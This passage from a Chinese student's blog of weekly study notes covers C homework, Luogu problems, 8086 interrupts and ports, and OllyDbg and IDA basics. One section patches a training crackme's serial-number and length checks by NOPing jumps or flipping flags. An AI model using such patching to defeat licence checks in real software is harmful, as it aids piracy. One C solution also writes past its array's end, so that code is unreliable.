class="keyword">if</span>(head-&gt;elecode!=n) &#123;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">				nextp=nextp-&gt;next;</span><br><span class="line">			&#125; <span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;错误编码&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			</span><br><span class="line">			nextp-&gt;next=head-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(head);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;成功删除&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	FILE* fp;</span><br><span class="line">	fp = fopen(<span class="string">&quot;.\\medinfo.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (p) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d %s %.2lf %s %d %d %d\n&quot;</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line"></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;保存成功\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">nextp</span>=</span>p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		<span class="keyword">while</span>(nextp) &#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			nextp=nextp-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp=fopen(<span class="string">&quot;.\\medinfo.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;文件无法打开&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		struct med *nextp,*head;</span><br><span class="line">		head=<span class="literal">NULL</span>;</span><br><span class="line">		nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;elecode)==<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,nextp-&gt;name);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%lf&quot;</span>,&amp;nextp-&gt;price);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,&amp;nextp-&gt;type);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;prod);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;shelf);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;stock);</span><br><span class="line">			<span class="keyword">if</span>(head==<span class="literal">NULL</span>) &#123;</span><br><span class="line">				head=nextp;</span><br><span class="line">				p=head;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				head-&gt;next=nextp;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">			nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.17-2020.02.23</title>
    <url>/12995.html</url>
    <content><![CDATA[<h1>洛谷</h1>
<h2 id="函数整理">函数整理</h2>
<h3 id="memset">memset</h3>
<p>memset(数组名或指针，值，大小)<br>
可用于数组初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="sprintf">sprintf</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(<span class="keyword">char</span> *str, <span class="keyword">char</span> * format [, argument, ...]);  </span><br></pre></td></tr></table></figure>
<p>str为要写入的字符串；format为格式化字符串，与printf()函数相同；argument为变量。<br>
可用于把整数搞进字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%8x&quot;</span>, <span class="number">4567</span>);  <span class="comment">//小写16进制，宽度占8个位置，右对齐，保存在s中</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">char</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;The ASCII code of a is %d.&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>sprintf不检测数组长度，容易造成缓冲区溢出，可用snprintf()代替</p>
<h2 id="题">题</h2>
<h3 id="P1031-均分纸牌">P1031 均分纸牌</h3>
<p><img src="https://s2.ax1x.com/2020/02/23/3llMYn.md.png" alt=" "></p>
<p> <br>
没啥思路就看了题解:<br>
<img src="https://s2.ax1x.com/2020/02/23/3llnoj.png" alt=""><br>
得到代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">int</span> a[n];</span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">		sum+=a[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sum=sum/n;</span><br><span class="line">    <span class="comment">//均分过程：</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(a[i]-sum!=<span class="number">0</span>)&#123;</span><br><span class="line">			a[i+<span class="number">1</span>]+=a[i]-sum,</span><br><span class="line">			cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,cnt);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="P1548-棋盘问题">P1548 棋盘问题</h3>
<p><img src="https://s2.ax1x.com/2020/02/23/3llKFs.png" alt=" "></p>
<p> <br>
思路：只会枚举<br>
<img src="https://s2.ax1x.com/2020/02/23/3lleeg.md.png" alt=""><br>
(突然发现多弄了一个点上去…)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m;</span><br><span class="line">	<span class="keyword">int</span> rectangle=<span class="number">0</span>,square=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> a=<span class="number">0</span>;a&lt;m+<span class="number">1</span>;a++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">0</span>;b&lt;n+<span class="number">1</span>;b++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> x=a+<span class="number">1</span>;x&lt;m+<span class="number">1</span>;x++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> y=b+<span class="number">1</span>;y&lt;n+<span class="number">1</span>;y++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(a-x==b-y)</span><br><span class="line">						square++;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						rectangle++;</span><br><span class="line">						</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,square,rectangle);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>汇编学习</h1>
<h3 id="中断过程">中断过程</h3>
<p>cpu的硬件自动完成：用中断类型码找到中断向量，并用它设置cs和ip 这个工作的过程<br>
cpu在完成中断处理程序后，返回原来的执行点继续执行下面的指令。所以在设置cs:ip之前，还要将原来的cs和ip的值保存起来（同样，在使用call指令时也先保存当前cs和ip的值，再设置cs和ip）<br>
8086cpu收到中断信息后引发的中断过程：</p>
<ol>
<li>取得中断类型码</li>
<li>标志寄存器入栈</li>
<li>设置标志寄存器TF和IF值位0</li>
<li>cs内容入栈</li>
<li>ip内容入栈</li>
<li>从内存地址为中断类型码 *4和中断类型码 *4+2的两个字单元中读取中断处理程序的入口设置为cs和ip</li>
</ol>
<p>即：</p>
<ol>
<li>取得中断类型码N</li>
<li>pushf</li>
<li>TF=0,IF=0</li>
<li>push cs</li>
<li>push ip</li>
<li>(ip)=(N* 4),(cs)=(N* 4+2)</li>
</ol>
<h3 id="中断处理程序和iret指令">中断处理程序和iret指令</h3>
<p>由于cpu随时都可能检测到中断信息，随时都可能执行中断处理程序，所以中断处理程序必须一直储存在内存某段空间之中。<br>
中断处理程序的编写步骤：</p>
<ol>
<li>保存用到的寄存器</li>
<li>处理中断</li>
<li>恢复用到的寄存器</li>
<li>用iret指令返回</li>
</ol>
<p>iret指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br><span class="line">popf</span><br></pre></td></tr></table></figure>
<p> </p>
<p>8086支持256个中断，但系统中要处理的中断事件没有达到256个，所以在中断向量表中，许多单元都是空的</p>
<h3 id="单步中断">单步中断</h3>
<p>cpu在执行完一条指令后，如果检测到标志寄存器的TF位为1，则产生单步中断<br>
引发中断过程：</p>
<ol>
<li>取得中断类型码1</li>
<li>标志寄存器入栈，TF、IF设置为0<br>
#否则cpu永远只能执行单步中断处理程序的第一条指令</li>
<li>cs、ip 入栈</li>
<li>(ip)=(1* 4),(cs)=(1* 4+2)</li>
</ol>
<p>如果cpu不提供其他功能，只要cpu一加电，它就从预设的地方自动向下一直读取指令执行<br>
debug利用了cpu提供的功能，在使用T命令时，debug将TF设置为1<br>
cpu提供单步中断功能的原因：单步跟踪程序的执行过程</p>
<p>IF：中断允许标志位。控制cpu是否允许接收外部中断请求。若IF=1，8086能响应外部中断</p>
<h3 id="响应中断的特殊情况">响应中断的特殊情况</h3>
<p>如：</p>
<blockquote>
<p>在执行完向ss寄存器传送数据的指令后，即使发生中断，cpu也不会响应<br>
（<a href="https://brubbish.github.io/19661.html%EF%BC%89">https://brubbish.github.io/19661.html）</a></p>
</blockquote>
<p>如果在执行完设置ss的指令后 cpu响应中断，需要在栈中压入标志寄存器、cs和ip的值。而ss改变，sp未改变，ss：sp指向错误的栈顶，将引起错误。</p>
<p>应该利用这个特性，将设置ss和sp的指令连续存放</p>
<h3 id="int指令">int指令</h3>
<p>cpu执行int n 指令，相当于引发一个n号中断的过程：</p>
<ol>
<li>取中断类型码n</li>
<li>标志寄存器入栈，IF=0,TF=0</li>
<li>cs、ip 入栈</li>
<li>(ip)=(n *4), (cs)=(n *4+4)</li>
</ol>
<p>int 指令的最终功能与call指令相似，都是调用一段程序</p>
<h3 id="DOS中-断例程应用-中断例程">DOS中 断例程应用(中断例程)</h3>
<p>int 21h 中断例程是dos提供的中断例程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>是int 21h中断例程的4ch号功能等同于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah,4h       ;程序返回</span><br><span class="line">mov al,0        ;返回值</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>(ah)=4ch代表调用第21h号中断例程的4ch号子程序</p>
<h2 id="端口">端口</h2>
<p>各种存储器都和cpu的地址线、数据线、控制线相连。cpu在操作它们的时候，把他们都当作内存对待，把它们总的看做一个由若干存储单元组成的逻辑存储器（内存地址空间）<br>
和cpu通过总线相连的芯片除了存储器外，还有：</p>
<ol>
<li>接口卡上的接口芯片</li>
<li>主板上的接口芯片，cpu通过它们对部分外部设备进行访问</li>
<li>其他芯片</li>
</ol>
<p>在这些芯片中，都有一组可由cpu读写的寄存器，这些寄存器通过芯片和cpu的总线相连。cpu将这些寄存器当作端口，对它们进行统一编址，从而建立了统一的端口地址空间。</p>
<p>cpu可以直接读写：cpu内部寄存器、内存单元、端口 的数据</p>
<h3 id="端口的读写">端口的读写</h3>
<p>cpu最多可以定位64kb个不同的端口，端口地址范围为：0~65535<br>
端口的读写指令只有  in（从端口读取）和out（往端口写入)<br>
在in和out指令中，只能使用ax或al来存放读入或发送的数据。8位端口用al，16位端口用ax<br>
对0~255的端口进行读写时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in al,20h</span><br><span class="line">out 20h,al</span><br></pre></td></tr></table></figure>
<p>对255~65535的端口进行读写时端口号放在dx中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov dx,3f8h</span><br><span class="line">in al,dx</span><br><span class="line">out dx,al</span><br></pre></td></tr></table></figure>
<h3 id="CMOS-RAM芯片">CMOS RAM芯片</h3>
<p>包含一个实时钟和128个字节的ram存储器<br>
由电池供电，关机后仍然工作，ram中信息不丢失<br>
一部分单元保存时间信息，其余大部分单元保存系统配置信息<br>
有两个端口，70h为地址端口，71h为数据端口</p>
<h2 id="shl和shr指令">shl和shr指令</h2>
<p>shl是逻辑左移指令，移出的最后一位写入cf中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,01001000</span><br><span class="line">shl al,1          ;将al中的数据左移一位</span><br></pre></td></tr></table></figure>
<p>执行后(al)=10010000, cf=0</p>
<p>移动位数大于1时，将移动位数放在cl中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,01001000</span><br><span class="line">mov cl,3</span><br><span class="line">shl al,cl</span><br></pre></td></tr></table></figure>
<p> <br>
shr是逻辑右移指令，移出的最后一位写入cf中</p>
<p>左移一位相当于X=X*2,右移一位相当于X=X/2</p>
<h3 id="CMOS-RAM中储存的时间信息">CMOS RAM中储存的时间信息</h3>
<p>CMOS RAM中存放着年月日时分秒，这六个信息长度都为一个字节，以BCD码的方式存放。</p>
<h4 id="BCD码">BCD码</h4>
<p>以四位二进制数表示十进制数的编码方式<br>
一个字节可以表示两个BCD码，高4位表示十位，低4位表示个位</p>
<h2 id="外中断">外中断</h2>
<p>及时处理外设的输入需要解决：1.cpu如何得知外设输入的时间 2.cpu从何处得到外设的输入</p>
<h3 id="外中断信息">外中断信息</h3>
<p>当cpu外部有需要处理的事情发生的时候，相关芯片将向cpu发出相应的中断信息。cpu在执行完当前指令后，可以检测到发送过来的中断信息，引发中断过程，处理外设的输入</p>
<h4 id="外中断源：">外中断源：</h4>
<ul>
<li>可屏蔽中断</li>
</ul>
<p>是cpu可以不响应的外中断。如果IF=1，则cpu在执行完当前指令后响应中断；如果IF=0，则不响应可屏蔽中断<br>
中断类型码由数据总线送入cpu，不由cpu产生</p>
<p>8086提供的设置IF指令：<br>
1.sti—设置IF=1<br>
2.cli—设置IF=0</p>
<ul>
<li>不可屏蔽中断</li>
</ul>
<p>是cou必须响应的外中断。<br>
对于8086cpu，不可屏蔽中断的中断类型码固定为2</p>
<p>几乎所有由外设引发的外中断都是可屏蔽中断<br>
不可屏蔽中断是在系统中有必须处理的紧急情况发生时用来通知cpu的中断信息</p>
<h3 id="pc机键盘的处理过程">pc机键盘的处理过程</h3>
<ol>
<li>键盘输入<br>
按下一个键时，键盘中的芯片产生一个扫描码（通码），说明了按下的建在键盘上的位置；松开按下的键时，也产生一个扫描码（断码），送入60h端口<br>
扫描码的长度为一个字节，通码第七位为0，断码第七位为1：通码+80h=通码</li>
<li>引发9号中断<br>
相关芯片向cpu发出中断类型码为9的可屏蔽中断信息</li>
<li>执行int 9 中断例程<br>
BIOS提供了int 9中断例程，用来进行基本的键盘输入处理：<br>
1.读出扫描码<br>
2.如果是字符键的扫描码，将该扫描码和对应的ASCII码送入内存中的BIOS键盘缓冲区；如果是控制键，则将其转变为状态字节（二进制位控制状态的字节）写入内存中储存状态字节的单元<br>
3.对键盘系统进行相关控制</li>
</ol>
<p>BIOS键盘缓冲区是系统启动后，BIOS用于存放INT 9中断例程所接收的键盘输入的内存区。可以储存15个键盘输入，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码</p>
<h2 id="直接定址表">直接定址表</h2>
<h3 id="描述了单元长度的标号">描述了单元长度的标号</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a db 1,2,3,4,5,6,7,8</span><br><span class="line">b dw 0</span><br></pre></td></tr></table></figure>
<p>a,b 后面没有’:’ ，这种标号不但表示了内存单元的地址，还表示了内存单元的长度，即字节单元(db)或字单元(dw)或双子单元(dd)</p>
<p>offset操作符：取得标号的段地址（<a href="https://brubbish.github.io/34199.html#offset">https://brubbish.github.io/34199.html#offset</a> ）<br>
seg操作符：取得标号的段地址</p>
<h1>OllyDbg 学习</h1>
<h2 id="32位寄存器">32位寄存器</h2>
<p>有EAX、ECX、EDX、EBX、ESP、EBP、ESI等。<br>
调试时可以双击寄存器，修改寄存器的值。对EIP寄存器需要在反汇编窗口选择新的指令起始地址（‘New origin here’）<br>
标志寄存器：C、P、A、Z、S、T、D、O,双击值可以在0和1值切换</p>
<h2 id="单步跟踪快捷键">单步跟踪快捷键</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F7    单步步进，遇到call指令跟进</span><br><span class="line">F8    单步步过，遇到call指令不跟进</span><br><span class="line">F9+CTRL   直到出现ret/retf/iret指令中断</span><br><span class="line">F9+Alt    回到应用程序领空</span><br><span class="line">F9    运行程序</span><br><span class="line">F2    设置断点</span><br><span class="line">F2+CTRL   重新调试</span><br><span class="line">F12   暂停程序</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="一个TraceMe">一个TraceMe</h2>
<p>win32位获取文本框中内容的函数：<br>
GetDlgItemTextA<br>
GetDlgItemTextW<br>
GetWindowTextA<br>
GetWindowTextW<br>
用’CTRL+G’打开跟随表达式窗口进行搜索</p>
<p>在函数入口处设一个断点，程序执行到此处暂停<br>
<img src="https://s2.ax1x.com/2020/02/21/3KiIIJ.png" alt=""><br>
然后按’F9+Alt’跳到调用函数的位置<br>
 </p>
<p><img src="https://s2.ax1x.com/2020/02/21/3KEqte.png" alt=""><br>
004011E5-004011F5是用来判断用户名和序列号的<br>
顺便：因为真没见过test指令所以搜了一下：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kOTg5NDAzNzI5YWI=">汇编语言–test和cmp区别<i class="fa fa-external-link-alt"></i></span><br>
 </p>
<p><img src="https://s2.ax1x.com/2020/02/21/3KiTi9.png" alt=""><br>
执行到004011F5处，为了不跳转，把ZF寄存器取反或把此处指令改为nop<br>
另外，程序限制字符要大于4个，在004011D5的位置。可以把此处跳转的指令（jl）改为nop，或把SF值和OF值改为相同。<br>
<img src="https://s2.ax1x.com/2020/02/21/3Ki5a4.png" alt="..."></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.02-2020.03.08</title>
    <url>/2f00783a.html</url>
    <content><![CDATA[<h1>IDA</h1>
<h2 id="四个快捷键">四个快捷键</h2>
<p>添加注释：冒号或分号<br>
跳转到某个地址（16进制）：‘G’;返回（后退）：‘Esc’;前进：‘Ctrl+Enter’</p>
<h2 id="交叉参考">交叉参考</h2>
<p>可以知道指令代码相互调用的关系<br>
<img src="https://s2.ax1x.com/2020/03/02/3RV2Ox.md.png" alt=" "><br>
'↑j’中j表示跳转，o表示偏移量，p表示子程序，双击或按回车可以跳到调用该处的地方<br>
在‘loc_xxxxx’上按’x’打开交叉参考窗口</p>
<span id="more"></span>
<h2 id="参考重命名">参考重命名</h2>
<p>可把所有 loc_xxxxxx 重命名<br>
<img src="https://s2.ax1x.com/2020/03/02/3Ru4WF.png" alt=" "></p>
<h2 id="标签">标签</h2>
<p>打开标记当前位置功能：‘jump’-&gt;‘mark position’  快捷键:‘Alt+M’<br>
标记后在其他位置可以跳转到标记时光标的位置，快捷键：‘Ctrl+M’</p>
<p><img src="https://s2.ax1x.com/2020/03/05/3TRn9e.png" alt=" "><br>
<img src="https://s2.ax1x.com/2020/03/05/3TRVAK.png" alt=" "></p>
<h2 id="格式化指令操作数">格式化指令操作数</h2>
<p>把常量转换为十六、十、八、二进制<br>
<img src="https://s2.ax1x.com/2020/03/05/3TRehD.png" alt=" "></p>
<h2 id="函数的操作">函数的操作</h2>
<h2 id="代码和数据转换">代码和数据转换</h2>
<p>IDA可能无法正确区分数据字节和代码字节，有些程序利用这一点对抗静态反汇编<br>
用户可以将某段数据指定为代码或数据<br>
方法：‘Edit’-&gt;‘Code’/‘Data’(快捷键’C’/‘D’)，'D’会将数据类型在db，dw，dd之间转换<br>
按’U’取消定义后得到一些可以重新定义的字节，按’P’将某段代码定义为子程序<br>
<img src="https://s2.ax1x.com/2020/03/05/3TRZtO.png" alt=" "><br>
—&gt;<br>
<img src="https://s2.ax1x.com/2020/03/05/3TRk0x.md.png" alt="按'c'结果如图"></p>
<h2 id="字符串">字符串</h2>
<p>编程语言的不同造成字符串格式不同<br>
c语言字符串以0结尾，dos字符串以$结尾,其他可见于’Edit’-&gt;‘string’<br>
<img src="https://s2.ax1x.com/2020/03/05/3T7bP1.png" alt="3T7bP1.png"><br>
按’A’生成一个变量名，按’U’恢复，在’View’-&gt;‘Open subviews’-&gt;'Names’可以看到字符串变量</p>
<h2 id="数组">数组</h2>
<p>可以将数据按数组的形式显示<br>
<img src="https://s2.ax1x.com/2020/03/06/3bDXcR.png" alt="未识别的数组"><br>
‘Edit’-&gt;‘Array’或’ * '打开数组排列调整窗口<br>
<img src="https://s2.ax1x.com/2020/03/06/3b6yKs.png" alt="调整数组大小、每行项数（0自动调整）、对齐方式（0自动调整）"><br>
<img src="https://s2.ax1x.com/2020/03/06/3bDO39.png" alt="设置为'3 0 -1'的结果"></p>
<h2 id="结构体">结构体</h2>
<p>对一些常见的文件类型，IDA会自动加载相应的类型库，这些类型库中有相应的结构体。<br>
‘Shift+F11’打开加载类型库窗口（Loaded Type Libarries)，右键’Load Type Libarary’，'Insert’添加类型库</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*******************************************************</span></span><br><span class="line"><span class="comment">*程序:Structures.cpp                                                                                      *</span></span><br><span class="line"><span class="comment">*用途:IDA结构体反汇编                                                                        *</span></span><br><span class="line"><span class="comment">*   看雪软件安全网站                                                                              *   </span></span><br><span class="line"><span class="comment">*    www.pediy.com, kanxue 2002.8                                                                 *</span></span><br><span class="line"><span class="comment">********************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">	&#123;</span><span class="keyword">int</span> id;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[2]=</span>&#123;&#123;<span class="number">01</span>,<span class="string">&quot;Mary&quot;</span>,<span class="number">14</span>&#125;,&#123;<span class="number">02</span>,<span class="string">&quot;Angela&quot;</span>,<span class="number">15</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="keyword">for</span>(p=stu;p&lt;stu+<span class="number">2</span>;p++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d  %-20s%4d\n&quot;</span>,p-&gt;id,p-&gt;name,p-&gt;age);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.ax1x.com/2020/03/06/3LK7fU.png" alt="对应了main()里的内容，结构体存在“unk_407030”那块"></p>
<p><img src="https://s2.ax1x.com/2020/03/06/3Lu7Md.md.png" alt="没有定义结构体时自动生成"><br>
如[esi+18h]调用了结构体中的数据，可用有意义的名字代替<br>
先把结构体数据中的数据重新定义<br>
<img src="https://s2.ax1x.com/2020/03/06/3LQWaq.md.png" alt="参考数组、字符串、数据类型"><br>
打开结构体窗口，insert一个结构类型。按’d’添加数据/切换数据类型，按’a’切换为字符串，按’n’修改结构体成员的名字<br>
<img src="https://s2.ax1x.com/2020/03/07/3OW2SP.png" alt=" "><br>
将光标定位在相应地址处，'Edit-&gt;‘Struct var’选择相应结构体类型<br>
<img src="https://s2.ax1x.com/2020/03/07/3OfiSx.png" alt="调整后"><br>
按’T’，在操作数类型中重新定义现有数据：<br>
<img src="https://s2.ax1x.com/2020/03/07/3OzPyD.png" alt=" "><br>
选择一片代码后可以批量进行替换：<br>
<img src="https://s2.ax1x.com/2020/03/07/3X9BnS.png" alt=""><br>
<em>lea：</em><br>
<em>lea bx，data</em><br>
<em>lea是load effective address 的缩写，是取源操作数的偏移地址，并将其传送到目的操作数单元。类似于C语言的取地址符&amp;。</em><br>
<em>lea eax,[eax+2</em>eax]的效果是eax = eax + eax * 2*<br>
<em>mov edx,[ebp+16]的效果是edx=(dword)(ebp+16).</em></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.08-2020.03.15</title>
    <url>/232092d7.html</url>
    <content><![CDATA[<h1>IDA</h1>
<h2 id="枚举">枚举</h2>
<p>‘View’-&gt;‘Open subviews’-&gt;‘Enumerations’ 打开枚举窗口，按’Insert’插入新的枚举类型，按’N’添加成员<br>
选中需要重新定义的数据，按’M’后将其转换<br>
<img src="https://s1.ax1x.com/2020/03/12/8etGNT.md.png" alt="8etGNT.md.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/12/8etJ4U.md.png" alt="8etJ4U.md.png"></p>
<span id="more"></span>
<h2 id="FLIRT">FLIRT</h2>
<p>库文件快速识别与鉴定技术<br>
